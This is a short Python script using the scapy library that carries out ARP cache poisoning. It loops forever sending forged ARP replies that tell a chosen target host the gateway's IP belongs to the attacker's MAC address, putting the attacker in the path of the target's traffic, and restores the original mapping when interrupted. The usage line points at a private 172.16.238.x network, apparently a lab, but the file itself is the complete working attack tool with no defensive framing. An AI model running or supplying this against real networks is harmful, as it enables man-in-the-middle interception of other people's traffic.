import sys
from time import sleep
from scapy.all import (ARP, Ether, send, srp, get_if_hwaddr, getmacbyip)

def do_poison_arp(attacker_mac, target_gw_ip, 
        target_mac, target_ip):
    while True:
        send(ARP(hwsrc=attacker_mac, 
                    psrc=target_gw_ip, 
                    hwdst=target_mac, 
                    pdst=target_ip
                   ),
              verbose=False)
        sleep(3)

def restore_arp(original_gw_mac, target_gw_ip,
        target_mac, target_ip):
    send(ARP(hwsrc=original_gw_mac,
            psrc=target_gw_ip,
            hwdst=target_mac,
            pdst=target_ip
            ),
        verbose=False)

def main(target_ip, target_gw_ip, iface):
    attacker_mac    = get_if_hwaddr(iface) 
    target_mac      = getmacbyip(target_ip)
    original_gw_mac = getmacbyip(target_gw_ip)

    try:
        print(f"Poisoning ARP cache of {target_ip}..")
        do_poison_arp(attacker_mac, target_gw_ip, target_mac, target_ip)
    except KeyboardInterrupt:
        print("Restoring ARP cache..")
        restore_arp(original_gw_mac, target_gw_ip, target_mac, target_ip)

if __name__ == "__main__":
    if(len(sys.argv) != 4):
        print(f"python {sys.argv[0]} <target> <target_gateway> <iface>")
        print(f"python {sys.argv[0]} 172.16.238.12 172.16.238.1 eth0")
        sys.exit(0)
    main(sys.argv[1], sys.argv[2], sys.argv[3])
